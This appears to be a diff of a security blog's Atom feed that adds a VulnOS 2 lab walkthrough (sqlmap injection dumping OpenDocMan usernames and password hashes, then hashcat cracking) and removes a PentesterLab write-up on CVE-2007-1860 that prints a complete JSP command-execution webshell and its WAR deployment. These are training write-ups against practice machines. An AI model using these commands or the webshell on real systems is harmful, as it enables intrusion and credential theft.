@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-19T16:19:26-05:00</updated>
+  <updated>2016-07-20T15:20:18-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,123 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[vulos2]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/20/vulos2/"/>
+    <updated>2016-07-20T13:36:54-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/20/vulos2</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>sqlmap</li>
+<li>hash-identifier</li>
+<li></li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.104 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.104 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22, 80 and 6667 are opening.</p>
+
+<p>use wfuzz to scan. Nothing interesting.</p>
+
+<p>use Niko to scan. Same.</p>
+
+<p>Check the webpage, looks like a link may be useful.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Double click it.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Exam the links. In <code>Document</code>, I found this:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like path <code>/jabcd0cs/</code> is available.</p>
+
+<p>go to  <code>http://192.168.56.104/jabcd0cs/</code>, I found the app is OpenDocMan v1.2.7.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit opendocman</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got the exploit. Try the sql injection vulnerability:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --level=5 --risk=3</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now I know the database type is MySQL.</p>
+
+<p>Next try to dump all table names</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --tables --dbms=mysql</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <code>odm_user</code> is the table I want to take a look at.</p>
+
+<p>now dump columns from table <code>odm_user</code></p>
+
+<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -T odm_user  --columns --dbms=mysql</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <code>username</code> and <code>password</code></p>
+
+<p>now time to dump all content from <code>username</code> and <code>password</code>,</p>
+
+<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -C username,password --dump --dbms=mysql</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use hash-identifier to detect hash type</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like they are MD5.</p>
+
+<p>use hashcat to crack it</p>
+
+<p><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/vulos2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>only guest&rsquo;s password is cracked.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[SecTalks: BNE0x02 - Fuku]]></title>
@@ -4110,182 +4227,6 @@ In Debian Linux, the tomcat configuration file tomcat-users.xml has default loca
 <p>Oh&hellip;..</p>
 
 <p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/gameover.jpeg" title="[title manually exploit [alt text]]" ></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentesterlab--cve-2007-1860]]></title>
-    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860/"/>
-    <updated>2016-04-05T12:04:47-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860</id>
-    <content type="html"><![CDATA[<p><em>By means of these seven considerations I can forecast victory or defeat.</em> &mdash;&ndash; The Art of War</p>
-
-<p>This course details the exploitation of a vulnerability in mod_jk and how by using this issue it is possible to access the administration interface of a Tomcat server (Tomcat&rsquo;s manager). Then using this access, we will see how an attacker can use default credentials to log in as administrator and use this access to gain code execution on the server. &mdash;Pentesterlab</p>
-
-<p>Difficluty: 2/5</p>
-
-<!--more-->
-
-
-<h3>Forces:</h3>
-
-<ul>
-<li>Nmap</li>
-<li>NC</li>
-<li>Firebug</li>
-<li>webshell</li>
-</ul>
-
-
-<h3>Detail Assessment and Planning</h3>
-
-<ul>
-<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
-<li>Check http headers. &mdash;&ndash; NC</li>
-<li>Exploit and upload webshell. &mdash;- Firebug</li>
-</ul>
-
-
-<h3>Waging War</h3>
-
-<h4>Weaknesses and Strengths</h4>
-
-<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>By checking the application HTTP headers with nc, I can also get Apache service version.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
-</span><span class='line'>Host: 192.168.79.168</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
-
-<h4>Attack</h4>
-
-<p>First of all, we need to figure out the architecture of Tomcat and Apache. Read <a href="https://pentesterlab.com/exercises/cve-2007-1860/course">here</a></p>
-
-<p>If we try to visit a non-exist page, we will receive 404 error like that:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Based on the result, we know the http request is processed by Apache.</p>
-
-<p>If we try to visit page like 192.168.79.168/examples/jsp/test404, we will get the 404 error like:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Then we know that the http request is processed by Tomcat through Apache.</p>
-
-<p>Tomcat Manager is available at the following URI: /manager/html and is, most of the time, protected by a password. The CVE-2007-1860 vulnerability is described <a href="http://mail-archives.apache.org/mod_mbox/tomcat-dev/200706.mbox/%3C4667755F.6070700@apache.org%3E">advisory</a></p>
-
-<p>From pentesterlab,</p>
-
-<p><em>If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path configured to be forwarded to Tomcat (using <code>modjk</code>).</em></p>
-
-<p>Now we know how to access the /manager/html, (Sometimes you may need to repeat several times %252e%252e/)</p>
-
-<p><code>http://192.168.79.168/examples/jsp/%252e%252e/%252e%252e/manager/html</code></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>The credentials are one of the default ones. In this exerciese, the admin didn&rsquo;t change the credentials. The user name is admin and password is empty. Once we get it, we are able to get acces to the Tomcat Manager.</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Now we need to create a webshell and upload it to the Tomcat.</p>
-
-<h4>Deploy a webshell</h4>
-
-<p>webshell (from pentesterlab, you may generate it using msfvenom)</p>
-
-<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class='jsp'><span class='line'><span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="na">ACTION=</span><span class="s">&#39;index.jsp&#39;</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">name=</span><span class="s">&#39;cmd&#39;</span> <span class="na">type=</span><span class="s">text</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">&#39;Run&#39;</span><span class="nt">&gt;</span>
-</span><span class='line'><span class="nt">&lt;/FORM&gt;</span>
-</span><span class='line'><span class="k">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span> <span class="k">%&gt;</span>
-</span><span class='line'><span class="k">&lt;%</span>
-</span><span class='line'>   <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&quot;cmd&quot;</span><span class="o">);</span>
-</span><span class='line'>   <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
-</span><span class='line'>   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
-</span><span class='line'>      <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
-</span><span class='line'>      <span class="k">try</span> <span class="o">{</span>
-</span><span class='line'>         <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
-</span><span class='line'>         <span class="n">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
-</span><span class='line'>         <span class="k">while</span><span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="n">output</span> <span class="o">+=</span> <span class="n">s</span><span class="o">+</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="o">;</span> <span class="o">}</span>
-</span><span class='line'>      <span class="o">}</span>  <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>   <span class="o">}</span>
-</span><span class='line'>   <span class="o">}</span>
-</span><span class='line'><span class="k">%&gt;</span>
-</span><span class='line'><span class="nt">&lt;pre&gt;</span><span class="k">&lt;%=</span><span class="n">output</span> <span class="k">%&gt;</span><span class="nt">&lt;/pre&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>now we have to  pack the webshell</p>
-
-<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='jsp'><span class='line'>$ mkdir webshell
-</span><span class='line'>$ cp index.jsp webshell
-</span><span class='line'>
-</span><span class='line'>$ cd webshell
-</span><span class='line'>$ jar -cvf ../webshell.war *
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>webshell <code>webshell.war</code> is ready to fire.</p>
-
-<h4>Upload webshell</h4>
-
-<p>We can use the form to upload war file:
-<img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>However, it will give you a 404 page since the deployment url does not use the double -encoding trick to gain access to get the manager. So we have to use firebug to give the form right location.</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>change the location to :</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>After successful uploading webshell, it will show in the Tomcat manager:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now enjoy the webshell by accessing</p>
-
-<p><code>http://192.168.79.168/examples/%252e%252e/webshell/</code></p>
-
-<p> <img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
